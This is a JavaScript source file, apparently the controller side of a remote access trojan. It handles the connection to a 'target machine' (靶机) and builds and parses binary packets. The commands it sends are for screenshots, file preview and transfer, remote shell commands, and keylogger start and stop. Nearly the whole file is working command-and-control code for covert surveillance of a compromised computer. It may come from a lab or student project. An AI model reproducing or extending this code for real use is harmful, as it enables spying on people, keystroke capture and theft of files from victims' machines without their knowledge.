/*
 * @Auther: MercyLin
 * @Description: 处理与靶机的连接
 * @Date: 2020-09-09 19:06:25
 * @LastEditors: MercyLin
 * @LastEditTime: 2020-09-11 18:24:49
 * @FilePath: \seeds\src\main\Connect\index.js
 */

import config from '../config'
// import { logger } from '../logger'
import { getCurrentTarget } from './server'
import { disconnectTarget } from '../TargetList'
// import { updateKeyLogger, stopKeyLogger } from '../KeyBoard'
// import { fileNotFound, updateFilepreview, saveFile } from '../File'
import { shellConnect } from '../Shell'
// import { updateScreenShot } from '../ScreenShot'
import callback from './callback'

var encoding = require('encoding')
let target = null
/**
 * @description: 生成payload
 * @param {String} method 请求方法
 * @param {String} paras 请求参数
 * @param {String} Id packetID
 * @return {Buffer} 拼接好的payload
 */
function createRequsetPayload (method, params, Id) {
  var packetID = bufferWrite4(Id)
  var totalLength = 16
  var methodID = bufferWrite4(getMethodID(method))
  var paramCount
  var body = Buffer.alloc(0)

  if (params != null) {
    paramCount = Object.keys(params).length
    console.log(`params:${paramCount}`)
    console.log(JSON.stringify(params))
    for (var key in params) {
      body = Buffer.concat([body, bufferWrite4(key.length), Buffer.from(key),
        bufferWrite4(params[key].length), Buffer.from(params[key])])
      console.log(`${key}: ${params[key]}`)
      totalLength += (8 + key.length + params[key].length)
    }
  } else paramCount = 0

  var head = Buffer.concat([packetID, bufferWrite4(totalLength), methodID, bufferWrite4(paramCount)])
  var packet = Buffer.concat([head, body])
  return packet
}

/**
 * @description: 握手
 */
export function handshake () {
  target = getCurrentTarget().socket
  var response = Buffer.alloc(8)
  response.write('PONG')
  target.write(response)
}
/**
 * @description: 将内容写进一个4字节的Buffer中
 * @param {Number} content 写入的内容
 * @return {Buffer}
 */
function bufferWrite4 (content) {
  var buf = Buffer.alloc(4)
  buf.writeInt32LE(content)
  return buf
}

/**
 * @description: 根据method获取方法ID
 * @param {Number} method 方法名称
 * @return {String} 方法id
 */
function getMethodID (method) {
  return config.methodID[method]
}

/**
 * @description: 发送请求
 * @param {String} method 方法名称
 * @param {JSON} params 请求参数
 * @param {Number} timeout
 * @return {Promise}
 */
export function sendRequest (method, params = null, timeout = config.connection.RESPONSE_TIMEOUT) {
  return new Promise((resolve, reject) => {
    if (getCurrentTarget() === null) {
      reject(new Error('Not connected'))
    }
    target = getCurrentTarget()
    let socket = target.socket
    let packetID = callback.register(resolve)
    switch (method) {
      case 'getFilePreview':
        target.filepreviewQueue.push(packetID)
        break
      case 'screenShot':
        target.screenShotQueue.push(packetID)
        break
      case 'transFile':
        target.fileQueue.push(packetID)
        break
      case 'sendCommand':
        target.commandQueue.push(packetID)
        break
    }
    let payload = createRequsetPayload(method, params, packetID)
    console.log(payload)
    // logger.debug(`Sending payload ${payload}`)
    /* Send payload */
    socket.write(payload, () => setTimeout(() => {
      /* Report timeout when not receiving response after a specific timeout */
      callback.del(packetID)
      reject(new Error('Response timeout'))
    }, timeout))
  })
}

// function getStatus (statusCode) {
//   return config.statusCodes[statusCode.toString()]
// }

/**
 * @description: 解析回复
 * @param {Buffer} data 收到的数据包
 * @param {Target} target 靶机
 */
export function processData (data, target) {
  var packetID = data.slice(0, 4).readInt32LE()
  var statusCode = data.slice(4, 8).readInt32LE()
  var totalLength = data.slice(8, 12).readInt32LE()
  var content = data.slice(12, totalLength)

  const cb = callback.get(packetID)

  if (typeof cb !== 'undefined') {
    callback.del(packetID) // Delete callback when succeeded
    console.log(`Received packet ${packetID} response`)
    switch (statusCode) {
      case 201:
        shellConnect(target, true)
        // console.log(getCurrentTarget().isShellConnected)
        cb(getCurrentTarget().isShellConnected)
        break
      case 202:
        let index = {
          'filepreview': target.filepreviewQueue.indexOf(packetID),
          'screenShot': target.screenShotQueue.indexOf(packetID),
          'file': target.fileQueue.indexOf(packetID),
          'command': target.commandQueue.indexOf(packetID)
        }
        for (var key in index) {
          if (index[key] !== -1) {
            switch (key) {
              case 'filepreview':
                target.filepreviewQueue.shift()
                if (index[key] === 0) {
                  cb(content.toString())
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log('packet lost')
                }
                break
              case 'screenShot':
                target.screenShotQueue.shift()
                if (index[key] === 0) {
                  cb(content)
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log('packet lost')
                }
                break
              case 'file':
                target.fileQueue.shift()
                if (index[key] === 0) {
                  cb(content)
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log('packet lost')
                }
                break
              case 'command':
                target.commandQueue.shift()
                if (index[key] === 0) {
                  // 对shell返回编码进行了处理
                  cb(encoding.convert(content, 'UTF8', 'GBK').toString())
                  // console.log(clientList[0].filepreviewQueue)
                } else {
                  console.log('packet lost')
                }
                break
            }
            break
          }
        }
        break
      case 203:
        // updateKeyLogger(content)
        cb(content.toString())
        break
      case 204:
        // stopKeyLogger(content)
        let ks = 'keylsogger stop'
        cb(ks)
        break
      case 300:
        // fileNotFound()
        let fn = 'fileNotFound'
        cb(fn)
        break
      case 401:
        disconnectTarget(target)
        // console.log("dis")
        let dis = 'disconnectTarget'
        cb(dis)
        break
      case 402:
        shellConnect(target, false)
        // console.log(getCurrentTarget().isShellConnected)
        cb(getCurrentTarget().isShellConnected)
        break
      default:
        let wc = 'wrong status code'
        cb(wc)
    }
  } else {
    /* If there's no recorded callback, it is timeout or fake */
    console.log(`Received invalid packet ${packetID}`)
  }
  console.log(packetID)
  // console.log(getStatus(statusCode))
  console.log(totalLength)
  console.log(content)
}
